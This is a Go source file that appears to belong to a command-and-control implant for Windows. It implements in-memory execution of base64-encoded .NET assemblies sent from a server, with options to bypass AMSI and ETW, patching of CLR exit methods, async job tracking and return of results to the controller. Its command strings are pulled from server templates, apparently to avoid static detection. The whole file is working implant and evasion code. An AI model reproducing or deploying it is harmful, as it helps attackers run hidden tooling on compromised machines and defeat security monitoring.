// server/docker/payloads/TCP_Windows/inline_assembly.go

//go:build windows
// +build windows

package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"runtime"
	"strings"
	"sync"
	"time"
)

// IATemplate receives string templates from server
type IATemplate struct {
	Version   int      `json:"v"`
	Type      int      `json:"t"`
	Templates []string `json:"tpl"`
	Params    []string `json:"p"`
}

// IA template indices (must match server's common.go)
// Note: Core indices are defined in action_inline_assembly.go
// Status indices are defined in action_inline_assembly_async_jobs.go
// Async-specific indices are defined in action_inline_assembly_async.go
const (
	// Core inline assembly strings (830-843)
	idxIAOsWindows       = 830 // windows
	idxIACmdName         = 831 // inline-assembly
	idxIACmdNameAsync    = 832 // inline-assembly-async
	idxIATypeExe         = 833 // EXE
	idxIATypeDll         = 834 // DLL
	idxIAJobPrefix       = 835 // inline_asm_%d
	idxIATerminated      = 836 // terminated by user
	idxIAExitCodeLabel   = 837 // Exit code:
	idxIAFmtDoneCode     = 838 // \nDone (code: %d)\n
	idxIAFmtStartedID    = 839 // Started (ID: %s)
	idxIAFmtExecFail     = 840 // \n[!] Execution failed: %v\n
	idxIAFmtExecDone     = 841 // \n[+] Execution completed (exit code: %d)\n
	idxIAFmtAsyncStarted = 842 // Async inline assembly execution started (Job ID: %s)\n
	idxIAFmtOutputHint   = 843 // Use 'inline-assembly-output %s' to retrieve output
)

// Convenience functions for common template strings (uses iaTpl from action_inline_assembly.go)
func iaOsWindows() string       { return iaTpl(idxIAOsWindows) }
func iaCmdName() string         { return iaTpl(idxIACmdName) }
func iaCmdNameAsync() string    { return iaTpl(idxIACmdNameAsync) }
func iaTypeExe() string         { return iaTpl(idxIATypeExe) }
func iaTypeDll() string         { return iaTpl(idxIATypeDll) }
func iaJobPrefix() string       { return iaTpl(idxIAJobPrefix) }
func iaTerminated() string      { return iaTpl(idxIATerminated) }
func iaExitCode() string        { return iaTpl(idxIAExitCodeLabel) }
func iaFmtDone() string         { return iaTpl(idxIAFmtDoneCode) }
func iaFmtStarted() string      { return iaTpl(idxIAFmtStartedID) }
func iaFmtExecFail() string     { return iaTpl(idxIAFmtExecFail) }
func iaFmtExecDone() string     { return iaTpl(idxIAFmtExecDone) }
func iaFmtAsyncStarted() string { return iaTpl(idxIAFmtAsyncStarted) }
func iaFmtOutputHint() string   { return iaTpl(idxIAFmtOutputHint) }
func iaRunFor() string          { return iaTpl(idxIARunforFlag) }
func iaStatusRun() string       { return iaTpl(idxIAStatusRunning) }
func iaStatusFail() string      { return iaTpl(idxIAStatusFailed) }
func iaStatusKill() string      { return iaTpl(idxIAStatusKilled) }
func iaStatusDone() string      { return iaTpl(idxIAStatusCompleted) }

var (
	clrExecutionMutex sync.Mutex
	clrExecutionCount int
)

var (
	exitPreventionOnce sync.Once
	exitPrevention     *CLRExitPrevention
	exitMethodsPatched bool
)

func InitializeExitPrevention() {
	exitPreventionOnce.Do(func() {
		exitPrevention = NewCLRExitPrevention()

		if err := exitPrevention.PatchAllExitMethods(); err != nil {
		} else {
			exitMethodsPatched = true
			// removed debug log
		}
	})
}

// InlineAssemblyCommand handles synchronous inline .NET assembly execution
type InlineAssemblyCommand struct{}

func (c *InlineAssemblyCommand) Execute(ctx *CommandContext, args []string) CommandResult {
	// Parse template from Command.Data if available
	if ctx.CurrentCommand != nil && ctx.CurrentCommand.Data != "" {
		decoded, err := base64.StdEncoding.DecodeString(ctx.CurrentCommand.Data)
		if err == nil {
			var tpl IATemplate
			if err := json.Unmarshal(decoded, &tpl); err == nil {
				// Set shared template for other IA files to use
				SetInlineAssemblyTemplate(tpl.Templates)
			}
		}
	}

	osWindows := iaOsWindows()
	if runtime.GOOS != osWindows {
		return CommandResult{
			Output:   Err(E42),
			ExitCode: 1,
		}
	}

	// Track execution count
	clrExecutionMutex.Lock()
	clrExecutionCount++
	executionNumber := clrExecutionCount
	clrExecutionMutex.Unlock()

	// Initialize exit prevention before any assembly execution
	InitializeExitPrevention()

	var output strings.Builder

	// Get the command data from context first
	var configData string

	if ctx.CurrentCommand != nil && ctx.CurrentCommand.Data != "" {
		// Use the data from the current command context
		configData = ctx.CurrentCommand.Data
	} else if len(args) > 0 {
		// Fall back to args if provided
		configData = strings.Join(args, " ")
	} else {
		return CommandResult{
			Output:   Err(E43),
			ExitCode: 1,
		}
	}

	// Parse the JSON configuration
	var config struct {
		AssemblyB64 string   `json:"ab"`
		Arguments   []string `json:"ar"`
		AppDomain   string   `json:"ad"`
		BypassAMSI  bool     `json:"ba"`
		BypassETW   bool     `json:"be"`
		RevertETW   bool     `json:"re"`
		EntryPoint  string   `json:"ep"`
		UsePipe     bool     `json:"up"`
		PipeName    string   `json:"pm"`
	}

	if err := json.Unmarshal([]byte(configData), &config); err != nil {
		// Try to parse as base64 if JSON fails
		if _, decodeErr := base64.StdEncoding.DecodeString(configData); decodeErr == nil {
			config.AssemblyB64 = configData
			// Use remaining args as arguments if they exist
			if len(args) > 1 {
				config.Arguments = args[1:]
			}
		} else {
			return CommandResult{
				Output:   Err(E44),
				ExitCode: 1,
			}
		}
	}

	// Decode assembly
	assemblyBytes, err := base64.StdEncoding.DecodeString(config.AssemblyB64)
	if err != nil {
		return CommandResult{
			Output:   Err(E45),
			ExitCode: 1,
		}
	}

	// Detect assembly information
	isDLL := c.isDLLAssembly(assemblyBytes)
	assemblyType := iaTypeExe()
	if isDLL {
		assemblyType = iaTypeDll()
	}
	_ = assemblyType // suppress unused warning

	// Check for problematic patterns
	runFor := iaRunFor()
	for _, arg := range config.Arguments {
		if strings.Contains(strings.ToLower(arg), runFor) {
			output.WriteString(Succ(S26) + "\n")
			break
		}
	}

	if executionNumber > 1 {
		output.WriteString(SuccCtx(S27, fmt.Sprintf("%d", executionNumber)) + "\n")
	}

	// Show exit prevention status
	if exitMethodsPatched {
		output.WriteString(SuccCtx(S28, fmt.Sprintf("%d", len(exitPrevention.GetPatchedMethods()))) + "\n")
	}

	// Execute with protection (this method is defined in action_inline_assembly.go)
	assemblyOutput, exitCode := c.executeWindowsAssembly(assemblyBytes, config, executionNumber)

	output.WriteString(assemblyOutput)

	return CommandResult{
		Output:   output.String(),
		ExitCode: exitCode,
	}
}

// isDLLAssembly checks if the assembly is a DLL
func (c *InlineAssemblyCommand) isDLLAssembly(assemblyBytes []byte) bool {
	// Check PE headers to determine if it's a DLL
	if len(assemblyBytes) < 0x3C+4 {
		return false
	}

	// Check for MZ header
	if assemblyBytes[0] != 'M' || assemblyBytes[1] != 'Z' {
		return false
	}

	// Get PE header offset
	peOffset := int32(assemblyBytes[0x3C]) |
		int32(assemblyBytes[0x3D])<<8 |
		int32(assemblyBytes[0x3E])<<16 |
		int32(assemblyBytes[0x3F])<<24

	if int(peOffset+0x17) >= len(assemblyBytes) {
		return false
	}

	// Check characteristics for DLL flag (0x2000)
	characteristics := uint16(assemblyBytes[peOffset+0x16]) | uint16(assemblyBytes[peOffset+0x17])<<8
	return (characteristics & 0x2000) != 0
}

// InlineAssemblyAsyncCommand handles async inline .NET assembly execution
type InlineAssemblyAsyncCommand struct {
	InlineAssemblyCommand
}

// Execute method for InlineAssemblyAsyncCommand to use the new async execution
func (c *InlineAssemblyAsyncCommand) Execute(ctx *CommandContext, args []string) CommandResult {
	// Generate a unique job ID
	jobPrefixFmt := iaJobPrefix()
	jobID := fmt.Sprintf(jobPrefixFmt, time.Now().UnixNano())

	// Get the current command from context
	var currentCmd Command
	if ctx.CurrentCommand != nil {
		currentCmd = *ctx.CurrentCommand
		currentCmd.JobID = jobID
	}

	// Create assembly job for tracking
	statusRun := iaStatusRun()
	job := &AssemblyJob{
		ID:          jobID,
		CommandID:   currentCmd.CommandID,
		CommandDBID: currentCmd.CommandDBID,
		AgentID:     currentCmd.AgentID,
		Name:        currentCmd.Filename,
		Status:      statusRun,
		StartTime:   time.Now(),
		CancelChan:  make(chan bool, 1),
		Command:     currentCmd,
	}

	// Add job to assembly job manager
	assemblyJobManager.AddJob(job)

	// Also create job info for commandQueue tracking (for compatibility)
	cmdNameAsync := iaCmdNameAsync()
	jobInfo := JobInfo{
		ID:        jobID,
		StartTime: time.Now(),
		Filename:  currentCmd.Filename,
		Active:    true,
		Type:      cmdNameAsync,
	}

	// Store job info in the global commandQueue
	if commandQueue != nil {
		commandQueue.mu.Lock()
		commandQueue.activeJobs[jobID] = jobInfo
		commandQueue.mu.Unlock()
	}

	// Start async execution
	go func() {
		defer func() {
			if r := recover(); r != nil {
				job.OutputMutex.Lock()
				statusFail := iaStatusFail()

				job.Status = statusFail
				job.Error = fmt.Errorf(ErrCtx(E52, fmt.Sprintf("%v", r)))
				endTime := time.Now()
				job.EndTime = &endTime
				job.Output.WriteString("\n" + ErrCtx(E52, fmt.Sprintf("%v", r)) + "\n")
				finalOutput := job.Output.String()
				job.OutputMutex.Unlock()

				// Send crash result
				crashResult := CommandResult{
					Output:      finalOutput,
					Error:       job.Error,
					ExitCode:    -1,
					CompletedAt: time.Now().Format(time.RFC3339),
					JobID:       jobID,
				}
				if resultManager != nil {
					resultManager.AddResult(&crashResult)
				}
			}
		}()

		// Parse the assembly config
		var config struct {
			AssemblyB64 string   `json:"ab"`
			Arguments   []string `json:"ar"`
			AppDomain   string   `json:"ad"`
			BypassAMSI  bool     `json:"ba"`
			BypassETW   bool     `json:"be"`
			RevertETW   bool     `json:"re"`
			EntryPoint  string   `json:"ep"`
			UsePipe     bool     `json:"up"`
			PipeName    string   `json:"pm"`
		}

		// Parse from the Data field
		if currentCmd.Data != "" {
			if err := json.Unmarshal([]byte(currentCmd.Data), &config); err != nil {
				job.OutputMutex.Lock()
				statusFail2 := iaStatusFail()

				job.Status = statusFail2
				job.Error = err
				job.Output.WriteString(Err(E44))
				endTime := time.Now()
				job.EndTime = &endTime
				job.OutputMutex.Unlock()
				return
			}
		}

		// Decode assembly
		assemblyBytes, err := base64.StdEncoding.DecodeString(config.AssemblyB64)
		if err != nil {
			job.OutputMutex.Lock()
			statusFail3 := iaStatusFail()
			job.Status = statusFail3
			job.Error = err
			job.Output.WriteString(Err(E45))
			endTime := time.Now()
			job.EndTime = &endTime
			job.OutputMutex.Unlock()
			return
		}

		// Execute with async capture
		var exitCode int

		osWindows := iaOsWindows()
		if runtime.GOOS == osWindows {
			// Use the Windows-specific async method
			tokenContext := captureCurrentAssemblyTokenContext()
			exitCode, err = c.executeWindowsAssemblyAsync(assemblyBytes, config, job, tokenContext)
		} else {
			// Fail on non-Windows platforms
			err = fmt.Errorf(Err(E2))
			exitCode = -1
			job.OutputMutex.Lock()
			job.Output.WriteString(Err(E2) + "\n")
			job.OutputMutex.Unlock()
		}

		// Update job status based on result
		job.OutputMutex.Lock()
		endTime := time.Now()
		job.EndTime = &endTime

		terminated := iaTerminated()
		statusKill := iaStatusKill()
		statusFail4 := iaStatusFail()
		statusDone := iaStatusDone()
		exitCodeLabel := iaExitCode()
		fmtExecFail := iaFmtExecFail()
		fmtExecDone := iaFmtExecDone()

		if err != nil {
			if strings.Contains(err.Error(), terminated) {
				job.Status = statusKill
			} else {
				job.Status = statusFail4
				job.Error = err
				if !strings.Contains(job.Output.String(), err.Error()) {
					job.Output.WriteString(fmt.Sprintf(fmtExecFail, err))
				}
			}
		} else {
			job.Status = statusDone
			if !strings.Contains(job.Output.String(), exitCodeLabel) {
				job.Output.WriteString(fmt.Sprintf(fmtExecDone, exitCode))
			}
		}

		finalOutput := job.Output.String()
		job.OutputMutex.Unlock()

		// Mark job as complete in commandQueue
		if commandQueue != nil {
			commandQueue.mu.Lock()
			if queueJob, exists := commandQueue.activeJobs[jobID]; exists {
				queueJob.Active = false
				commandQueue.activeJobs[jobID] = queueJob
			}
			commandQueue.mu.Unlock()
		}

		// CRITICAL: Send final result back to server
		// We need to include the Command data for the server to identify this result
		finalResult := CommandResult{
			Command:     currentCmd, // Include the command so server knows what this is for
			Output:      finalOutput,
			ExitCode:    exitCode,
			CompletedAt: time.Now().Format(time.RFC3339),
			JobID:       jobID,
		}

		// Send the result back through the result manager
		if resultManager != nil {
			if err := resultManager.AddResult(&finalResult); err != nil {
			} else {
			}
		} else {
		}

	}()

	fmtAsyncStarted := iaFmtAsyncStarted()
	fmtOutputHint := iaFmtOutputHint()
	return CommandResult{
		Output:      fmt.Sprintf(fmtAsyncStarted, jobID) + fmt.Sprintf(fmtOutputHint, jobID),
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
		JobID:       jobID,
	}
}
